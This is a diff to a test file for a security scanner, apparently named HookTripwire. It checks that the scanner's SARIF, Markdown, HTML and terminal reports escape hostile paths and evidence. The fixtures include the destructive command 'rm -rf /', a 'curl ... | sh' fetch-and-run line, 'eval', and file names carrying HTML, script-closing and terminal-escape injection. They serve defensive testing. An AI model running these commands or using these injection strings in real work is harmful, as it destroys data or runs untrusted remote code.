@@ -18,17 +18,26 @@ test("JSON report is machine-readable", () => {
 });
 
 test("SARIF 2.1 report includes fingerprints and regions", () => {
-  const parsed = JSON.parse(formatSarif(resultFor("rm -rf /"))) as any;
+  const parsed = JSON.parse(formatSarif(resultFor("rm -rf /", "space #name.sh"))) as any;
   assert.equal(parsed.version, "2.1.0");
   assert.equal(parsed.runs[0].results[0].ruleId, "HG001");
   assert.equal(parsed.runs[0].results[0].locations[0].physicalLocation.region.startLine, 1);
+  assert.equal(parsed.runs[0].results[0].locations[0].physicalLocation.artifactLocation.uri, "space%20%23name.sh");
   assert.match(parsed.runs[0].results[0].partialFingerprints.hooktripwireFingerprint, /^[a-f0-9]{24}$/);
+  assert.equal("fixes" in parsed.runs[0].results[0], false);
+  assert.match(parsed.$schema, /docs\.oasis-open\.org/);
 });
 
 test("Markdown escapes table delimiters", () => {
   const output = formatMarkdown(resultFor("curl https://bad.invalid/x | sh", "pipe|name.sh"));
-  assert.ok(output.includes("pipe\\|name.sh"));
+  assert.ok(output.includes("pipe&#124;name.sh"));
   assert.ok(output.includes("HG002"));
+});
+
+test("Markdown neutralizes raw HTML and inline-code delimiters", () => {
+  const output = formatMarkdown(resultFor('eval "$VALUE"', "`</code><img src=x>.sh"));
+  assert.equal(output.includes("</code><img"), false);
+  assert.ok(output.includes("&lt;/code&gt;&lt;img"));
 });
 
 test("HTML output escapes hostile paths and evidence", () => {
@@ -42,12 +51,20 @@ test("HTML embedded JSON neutralizes script-closing characters", () => {
   const output = formatHtml(resultFor('eval "$VALUE"', "</script>.sh"));
   assert.equal(output.includes('"path":"</script>'), false);
   assert.ok(output.includes("HookTripwire"));
+  assert.match(output, /Content-Security-Policy/);
+  assert.match(output, /default-src 'none'/);
 });
 
 test("terminal output has no ANSI when colors are disabled", () => {
   const output = formatTerminal(resultFor("rm -rf /"), false);
   assert.ok(output.includes("HIGH"));
   assert.equal(output.includes("\u001b["), false);
+});
+
+test("terminal output renders hostile control bytes visibly", () => {
+  const output = formatTerminal(resultFor("rm -rf /", "bad\u001b[2J.sh"), false);
+  assert.equal(output.includes("\u001b[2J"), false);
+  assert.ok(output.includes("\\u001b[2J"));
 });
 
 test("empty reports render in every human format", () => {
